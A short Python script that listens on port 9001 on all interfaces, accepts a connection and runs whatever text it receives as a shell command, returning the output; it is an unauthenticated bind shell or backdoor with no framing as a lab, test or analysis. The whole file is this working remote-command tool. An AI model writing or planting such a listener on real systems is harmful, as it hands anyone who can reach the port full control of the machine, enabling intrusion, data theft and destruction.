import socket
import subprocess


PORT = 9001

s = socket.socket()

s.bind(('', PORT))


s.listen(5)
flag = False
client, addr = s.accept()
while not flag:
    try:
        data = client.recv(1024)
        if not data:
            break
        data = data.decode()
        data = data.split(' ')
        data[len(data)-1] = data[len(data)-1][:-1]
        proc = subprocess.Popen(data,
                                stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()
        client.send(out)
    except:
        print('')
client.close()
s.close()
